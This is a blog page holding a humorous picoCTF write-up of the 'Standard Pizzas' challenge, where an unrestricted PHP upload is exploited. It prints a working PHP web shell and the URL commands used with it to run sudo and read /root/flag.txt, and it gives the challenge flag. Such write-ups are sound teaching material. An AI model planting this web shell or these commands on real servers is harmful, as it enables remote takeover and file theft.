<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>PicoCTF Writeup #482 | nullvm</title>
<meta name="keywords" content="ctf">
<meta name="description" content="Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup)
So, I tried another picoCTF challenge and this one was basically:
üë®‚Äçüíª ‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù
If you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: literally everything.
The challenge: Standard Pizzas üçï
Upload Feature? More Like Upload Malware
The site lets you upload an image and then proudly tells you where it lives:">
<meta name="author" content="Deni Andrian Prayoga">
<link rel="canonical" href="/posts/picoctf-writeup-482/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.ec03d813ea039cce70b66c029f89b0f5ee5f2e4fa806d9c6191739ac2c54bc8f.css" integrity="sha256-7APYE&#43;oDnM5wtmwCn4mw9e5fLk&#43;oBtnGGRc5rCxUvI8=" rel="preload stylesheet" as="style">
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="/posts/picoctf-writeup-482/">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@100..900&display=swap" rel="stylesheet">


 <link href="https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400..700&display=swap" rel="stylesheet">

<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="/posts/picoctf-writeup-482/">
  <meta property="og:site_name" content="nullvm">
  <meta property="og:title" content="PicoCTF Writeup #482">
  <meta property="og:description" content="Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:
üë®‚Äçüíª ‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù
If you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: literally everything.
The challenge: Standard Pizzas üçï
Upload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-20T10:06:40+07:00">
    <meta property="article:modified_time" content="2025-08-20T10:06:40+07:00">
    <meta property="article:tag" content="Ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PicoCTF Writeup #482">
<meta name="twitter:description" content="Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup)
So, I tried another picoCTF challenge and this one was basically:
üë®‚Äçüíª ‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù
If you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: literally everything.
The challenge: Standard Pizzas üçï
Upload Feature? More Like Upload Malware
The site lets you upload an image and then proudly tells you where it lives:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "PicoCTF Writeup #482",
      "item": "/posts/picoctf-writeup-482/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PicoCTF Writeup #482",
  "name": "PicoCTF Writeup #482",
  "description": "Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\nüë®‚Äçüíª ‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù\nIf you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas üçï\nUpload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\n",
  "keywords": [
    "ctf"
  ],
  "articleBody": "Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\nüë®‚Äçüíª ‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù\nIf you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas üçï\nUpload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\nThe file duck.jpeg has been uploaded Path: uploads/duck.jpeg As soon as I saw that, my brain went:\nüëâ ‚ÄúWait‚Ä¶ you‚Äôre telling me I can upload any file and then run it directly?‚Äù\nThis is basically the cybersecurity equivalent of putting the house keys under the doormat.\nCongratulations, You Played Yourself So I uploaded this masterpiece called script.php:\n\u003c?php $result = shell_exec(\"pwd\"); echo $result; ?\u003e Then I visited /uploads/script.php and the site politely told me:\n/var/www/html/uploads üí• RCE achieved. PHP once again proving it‚Äôs not a bug, it‚Äôs a lifestyle.\nPHP Webshell as a Service‚Ñ¢ One command was cute, but I wanted full control. So I made a tiny upgrade:\n\u003c?php $command = $_GET[\"c\"]; echo shell_exec($command); ?\u003e Now I could just run commands directly in the URL:\n/uploads/script.php?c=ls At this point I felt like a 90s movie hacker typing ‚Äúaccess mainframe‚Äù ‚Äî except it actually worked.\nDear Root, I‚Äôm in Your Walls The challenge said the flag was hiding in /root. No problem. Let‚Äôs snoop:\n/uploads/script.php?c=sudo -l Server: ‚ÄúYeah, you can sudo.‚Äù Me: ‚ÄúSay no more.‚Äù\n/uploads/script.php?c=sudo ls /root Output:\nflag.txt Time for the final payload:\n/uploads/script.php?c=sudo cat /root/flag.txt And there it was:\npicoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0} PHP + Uploads = Chaos.exe What did we learn, kids?\nIf you let users upload arbitrary files and run them, you‚Äôve basically created free hacker hosting. File extensions are lies. Never trust them. PHP with shell_exec is like giving a toddler a flamethrower. This challenge was basically an Any% speedrun exploit. Final Thoughts This challenge was a nostalgia trip ‚Äî straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like ‚ÄúxXhaxor69Xx‚Äù.\nSo yeah. Don‚Äôt let ‚Äúprofile pictures‚Äù execute shell commands. Unless you want hackers to order root access with their pizza. üçïüíª\nFlag: picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}\n",
  "wordCount" : "375",
  "inLanguage": "en",
  "datePublished": "2025-08-20T10:06:40+07:00",
  "dateModified": "2025-08-20T10:06:40+07:00",
  "author":{
    "@type": "Person",
    "name": "Deni Andrian Prayoga"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/picoctf-writeup-482/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nullvm",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="nullvm (Alt + H)">nullvm</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="/posts" title="Post">
                    <span>Post</span>
                </a>
            </li>
            <li>
                <a href="/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      PicoCTF Writeup #482
    </h1>
    <div class="post-meta"><span title='2025-08-20 10:06:40 +0700 +07'>August 20, 2025</span>&nbsp;¬∑&nbsp;2 min&nbsp;¬∑&nbsp;Deni Andrian Prayoga&nbsp;|&nbsp;<a href="https://github.com/nullvm/nullvm.github.io-precompiled/tree/main/content/posts/picoctf-writeup-482.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>

</div>
  </header> 
  <div class="post-content"><h2 id="hacking-profile-pictures-like-its-2005-picoctf-web-exploit-writeup">Hacking Profile Pictures Like It‚Äôs 2005 (picoCTF Web Exploit Writeup)<a hidden class="anchor" aria-hidden="true" href="#hacking-profile-pictures-like-its-2005-picoctf-web-exploit-writeup">#</a></h2>
<p>So, I tried another picoCTF challenge and this one was basically:</p>
<p>üë®‚Äçüíª <em>‚ÄúA developer added profile picture uploads. What could possibly go wrong?‚Äù</em></p>
<p>If you‚Äôve ever touched PHP (I‚Äôm sorry) you already know the answer: <strong>literally everything</strong>.</p>
<p>The challenge: <a href="https://play.picoctf.org/practice/challenge/482">Standard Pizzas</a> üçï</p>
<h2 id="upload-feature-more-like-upload-malware">Upload Feature? More Like Upload <em>Malware</em><a hidden class="anchor" aria-hidden="true" href="#upload-feature-more-like-upload-malware">#</a></h2>
<p>The site lets you upload an image and then proudly tells you where it lives:</p>
<pre tabindex="0"><code>The file duck.jpeg has been uploaded 
Path: uploads/duck.jpeg
</code></pre><p>As soon as I saw that, my brain went:</p>
<p>üëâ ‚ÄúWait‚Ä¶ you‚Äôre telling me I can upload <strong>any file</strong> and then run it directly?‚Äù</p>
<p>This is basically the cybersecurity equivalent of putting the house keys under the doormat.</p>
<h2 id="congratulations-you-played-yourself">Congratulations, You Played Yourself<a hidden class="anchor" aria-hidden="true" href="#congratulations-you-played-yourself">#</a></h2>
<p>So I uploaded this masterpiece called <code>script.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">shell_exec</span>(<span style="color:#98c379">&#34;pwd&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">echo</span> <span style="color:#e06c75">$result</span>;
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>Then I visited <code>/uploads/script.php</code> and the site politely told me:</p>
<pre tabindex="0"><code>/var/www/html/uploads
</code></pre><p>üí• RCE achieved. PHP once again proving it‚Äôs not a bug, it‚Äôs a lifestyle.</p>
<h2 id="php-webshell-as-a-service">PHP Webshell as a Service‚Ñ¢<a hidden class="anchor" aria-hidden="true" href="#php-webshell-as-a-service">#</a></h2>
<p>One command was cute, but I wanted <strong>full control</strong>.
So I made a tiny upgrade:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$command</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#34;c&#34;</span>];
</span></span><span style="display:flex;"><span><span style="color:#c678dd">echo</span> <span style="color:#e06c75">shell_exec</span>(<span style="color:#e06c75">$command</span>);
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>Now I could just run commands directly in the URL:</p>
<pre tabindex="0"><code>/uploads/script.php?c=ls
</code></pre><p>At this point I felt like a 90s movie hacker typing ‚Äúaccess mainframe‚Äù ‚Äî except it actually worked.</p>
<h2 id="dear-root-im-in-your-walls">Dear Root, I‚Äôm in Your Walls<a hidden class="anchor" aria-hidden="true" href="#dear-root-im-in-your-walls">#</a></h2>
<p>The challenge said the flag was hiding in <code>/root</code>.
No problem. Let‚Äôs snoop:</p>
<pre tabindex="0"><code>/uploads/script.php?c=sudo -l
</code></pre><p>Server: ‚ÄúYeah, you can sudo.‚Äù
Me: ‚ÄúSay no more.‚Äù</p>
<pre tabindex="0"><code>/uploads/script.php?c=sudo ls /root
</code></pre><p>Output:</p>
<pre tabindex="0"><code>flag.txt
</code></pre><p>Time for the final payload:</p>
<pre tabindex="0"><code>/uploads/script.php?c=sudo cat /root/flag.txt
</code></pre><p>And there it was:</p>
<pre tabindex="0"><code>picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}
</code></pre><h2 id="php--uploads--chaosexe">PHP + Uploads = Chaos.exe<a hidden class="anchor" aria-hidden="true" href="#php--uploads--chaosexe">#</a></h2>
<p>What did we learn, kids?</p>
<ul>
<li>If you let users upload arbitrary files and run them, you‚Äôve basically created <strong>free hacker hosting</strong>.</li>
<li>File extensions are lies. Never trust them.</li>
<li>PHP with <code>shell_exec</code> is like giving a toddler a flamethrower.</li>
<li>This challenge was basically an <em>Any% speedrun exploit</em>.</li>
</ul>
<h2 id="final-thoughts">Final Thoughts<a hidden class="anchor" aria-hidden="true" href="#final-thoughts">#</a></h2>
<p>This challenge was a nostalgia trip ‚Äî straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like ‚ÄúxXhaxor69Xx‚Äù.</p>
<p>So yeah. Don‚Äôt let ‚Äúprofile pictures‚Äù execute shell commands. Unless you want hackers to order root access with their pizza. üçïüíª</p>
<blockquote>
<p>Flag: <strong>picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}</strong></p></blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/ctf/">ctf</a></li>
    </ul>
  </footer><div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "deniandriancode-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="/">nullvm</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>


<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
